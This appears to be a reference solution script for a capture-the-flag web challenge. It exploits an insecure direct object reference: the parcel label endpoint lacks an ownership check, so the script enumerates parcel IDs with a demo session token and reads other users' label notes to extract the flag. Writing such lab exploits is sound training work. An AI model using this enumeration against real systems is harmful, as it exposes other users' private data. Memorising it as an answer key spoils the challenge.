// Reference solve — Courier, Templar. The detail route now checks ownership (403), but the label route does not.
// The flag is no longer parcel 1001's note: it has moved to the label copy of a random vault parcel. Open a demo
// session and read each foreign parcel's labelNote — the note stays a decoy, the label copy carries the flag.
const base = process.argv[2];
const { token } = await (await fetch(`${base}/api/session`, { method: 'POST' })).json();
const auth = { headers: { authorization: `Bearer ${token}` } };
for (let id = 1000; id <= 1010; id++) {
  const r = await fetch(`${base}/api/parcels/${id}/label`, auth);
  if (!r.ok) continue;
  const { labelNote } = await r.json();
  const m = /HVWA\{[a-z2-7]{26}\}/.exec(labelNote ?? '');
  if (m) { console.log(m[0]); break; }
}
